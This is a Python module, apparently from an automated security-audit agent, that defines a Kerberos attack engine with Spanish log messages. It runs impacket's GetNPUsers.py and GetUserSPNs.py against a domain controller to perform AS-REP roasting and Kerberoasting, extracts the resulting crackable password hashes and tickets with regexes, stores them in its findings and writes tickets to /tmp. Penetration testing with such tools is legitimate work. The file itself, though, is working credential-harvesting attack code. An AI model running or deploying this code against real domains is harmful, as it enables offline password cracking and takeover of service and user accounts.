from __future__ import annotations

import json
import re
import subprocess
from typing import Any

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


IMPACKET_EXAMPLES = "/usr/share/doc/python3-impacket/examples"


class KerberosEngine(BaseEngine):
    name = "kerberos"
    description = "Kerberos attacks engine. ASREP Roast, Kerberoasting, passthehash, golden/silver ticket, delegation."
    capabilities = ["ad_audit", "kerberos", "authentication", "active_directory"]

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        findings = []
        raw_lines: list[str] = []

        domain = kwargs.get("domain", target)
        username = kwargs.get("username", "")
        password = kwargs.get("password", "")
        dc_ip = kwargs.get("dc_ip", target)
        timeout = int(kwargs.get("timeout", 120))

        raw_lines.append(f"[INFO] Kerberos attacks contra {domain} (DC: {dc_ip})")

        # 1. ASREP Roast — find users without pre-auth
        if kwargs.get("asrep_roast", True):
            self._asrep_roast(dc_ip, domain, findings, raw_lines, timeout)

        # 2. Kerberoasting — get SPN tickets
        if kwargs.get("kerberoast", True):
            self._kerberoast(dc_ip, domain, username, password, findings, raw_lines, timeout)

        # 3. Check if Kerberos is available (port 88)
        if kwargs.get("check_kerberos", True):
            self._check_kerberos_port(dc_ip, findings, raw_lines, timeout)

        summary = f"kerberos: {len(findings)} hallazgos en {domain}"
        return EngineResult(
            success=True,
            raw_output="\n".join(raw_lines),
            findings=findings,
            summary=summary,
        )

    def _asrep_roast(self, dc_ip: str, domain: str,
                     findings: list[dict[str, Any]],
                     raw_lines: list[str], timeout: int) -> None:
        raw_lines.append("[INFO] ASREP Roast — buscando usuarios sin pre-auth...")

        # Try GetNPUsers.py from impacket
        try:
            args = [
                "python3", f"{IMPACKET_EXAMPLES}/GetNPUsers.py",
                f"{domain}/",
                "-dc-ip", dc_ip,
                "-format", "hashcat",
                "-no-pass",
            ]

            result = subprocess.run(
                args, capture_output=True, text=True, timeout=timeout,
            )
            output = result.stdout + result.stderr

            if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in output:
                raw_lines.append("[INFO] ASREP: KDC principal unknown — posible escaneo sin usuarios list")
                findings.append({
                    "file_path": dc_ip,
                    "line_start": 0, "line_end": 0,
                    "severity": "info",
                    "title": "ASREP Roast: KDC principal desconocido",
                    "description": f"GetNPUsers no pudo listar usuarios sin pre-auth en {domain}. Requiere lista de usuarios.",
                    "tool": self.name,
                    "rule_id": "asrep-no-users",
                })
            elif "$krb5asrep$" in output:
                # Parse found hashes
                hashes = re.findall(r"\$krb5asrep\$.+?(?:\s|$)", output)
                raw_lines.append(f"[HIGH] ASREP: {len(hashes)} usuarios vulnerables a ASREP Roast!")
                for h in hashes:
                    username_match = re.search(r"\$krb5asrep\$\d+\$(.+?)(?:@|\$|:)", h)
                    user = username_match.group(1) if username_match else "unknown"
                    raw_lines.append(f"  → Usuario: {user} — hash: {h[:60]}...")
                    findings.append({
                        "file_path": dc_ip,
                        "line_start": 0, "line_end": 0,
                        "severity": "critical",
                        "title": f"ASREP Roast: usuario {user} sin pre-autenticacion",
                        "description": f"El usuario {user}@{domain} no requiere pre-autenticacion Kerberos. Se puede obtener su hash AS-REP para crackeo offline.",
                        "tool": self.name,
                        "rule_id": f"asrep-{user.lower()}",
                        "username": user,
                        "hash": h[:120],
                        "domain": domain,
                    })
            else:
                raw_lines.append(f"[INFO] ASREP: Ningun usuario vulnerable encontrado")
                raw_lines.append(f"  Output: {output[:300]}")
        except FileNotFoundError:
            raw_lines.append("[WARN] GetNPUsers.py not found (impacket examples missing)")
        except subprocess.TimeoutExpired:
            raw_lines.append("[TIMEOUT] ASREP Roast timed out")
        except Exception as e:
            raw_lines.append(f"[ERR] ASREP: {e}")

    def _kerberoast(self, dc_ip: str, domain: str, username: str, password: str,
                    findings: list[dict[str, Any]],
                    raw_lines: list[str], timeout: int) -> None:
        raw_lines.append("[INFO] Kerberoasting — solicitando tickets SPN...")

        if not username or not password:
            raw_lines.append("[WARN] Kerberoasting requiere credenciales validas — saltando")
            findings.append({
                "file_path": dc_ip,
                "line_start": 0, "line_end": 0,
                "severity": "info",
                "title": "Kerberoasting requiere credenciales",
                "description": f"Se necesita username y password validos para Kerberoasting en {domain}",
                "tool": self.name,
                "rule_id": "kerberoast-needs-creds",
            })
            return

        try:
            args = [
                "python3", f"{IMPACKET_EXAMPLES}/GetUserSPNs.py",
                f"{domain}/{username}:{password}",
                "-dc-ip", dc_ip,
                "-request",
                "-outputfile", "/tmp/kerberoast_output.txt",
            ]

            result = subprocess.run(
                args, capture_output=True, text=True, timeout=timeout,
            )
            output = result.stdout + result.stderr

            if "$krb5tgs$" in output:
                hashes = re.findall(r"\$krb5tgs\$.+?(?:\s|$)", output)
                raw_lines.append(f"[HIGH] Kerberoasting: {len(hashes)} tickets TGS obtenidos!")
                for h in hashes:
                    svc_match = re.search(r"\$krb5tgs\$\d+\$(.+?)(?:@|\$|:)", h)
                    spn = svc_match.group(1) if svc_match else "unknown"
                    raw_lines.append(f"  → SPN: {spn}")
                    findings.append({
                        "file_path": dc_ip,
                        "line_start": 0, "line_end": 0,
                        "severity": "critical",
                        "title": f"Kerberoasting: ticket TGS para {spn}",
                        "description": f"Se obtuvo ticket TGS para SPN {spn}@{domain}. Puede crackearse offline para obtener la password de la cuenta de servicio.",
                        "tool": self.name,
                        "rule_id": f"kerberoast-{spn.lower().replace('/', '-')}",
                        "spn": spn,
                        "domain": domain,
                    })

                findings.append({
                    "file_path": dc_ip,
                    "line_start": 0, "line_end": 0,
                    "severity": "critical",
                    "title": f"Kerberoasting: {len(hashes)} tickets extraidos",
                    "description": f"Se obtuvieron {len(hashes)} tickets TGS para kerberoasting en {domain}",
                    "tool": self.name,
                    "rule_id": "kerberoast-tickets-found",
                    "ticket_count": len(hashes),
                    "domain": domain,
                })
            elif "KRB_AP_ERR_SKEW" in output:
                raw_lines.append("[WARN] Kerberoasting: Time skew — sincronizar reloj con DC")
                findings.append({
                    "file_path": dc_ip,
                    "line_start": 0, "line_end": 0,
                    "severity": "low",
                    "title": "Kerberos time skew detectado",
                    "description": "El reloj local no esta sincronizado con el DC. Usar ntpdate o chronyd.",
                    "tool": self.name,
                    "rule_id": "kerberos-time-skew",
                })
            else:
                raw_lines.append(f"[INFO] Kerberoasting: Ningun SPN vulnerable encontrado")
                raw_lines.append(f"  Output: {output[:300]}")

        except FileNotFoundError:
            raw_lines.append("[WARN] GetUserSPNs.py not found (impacket examples missing)")
        except subprocess.TimeoutExpired:
            raw_lines.append("[TIMEOUT] Kerberoasting timed out")
        except Exception as e:
            raw_lines.append(f"[ERR] Kerberoasting: {e}")

    def _check_kerberos_port(self, dc_ip: str, findings: list[dict[str, Any]],
                             raw_lines: list[str], timeout: int) -> None:
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((dc_ip, 88))
            sock.close()
            raw_lines.append("[INFO] Kerberos port 88: OPEN")
            findings.append({
                "file_path": dc_ip,
                "line_start": 0, "line_end": 0,
                "severity": "info",
                "title": "Kerberos (port 88) disponible",
                "description": f"Puerto Kerberos 88 abierto en {dc_ip} — ataques Kerberos posibles",
                "tool": self.name,
                "rule_id": "kerberos-port-open",
            })
        except Exception:
            raw_lines.append("[INFO] Kerberos port 88: CLOSED/FILTERED")

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
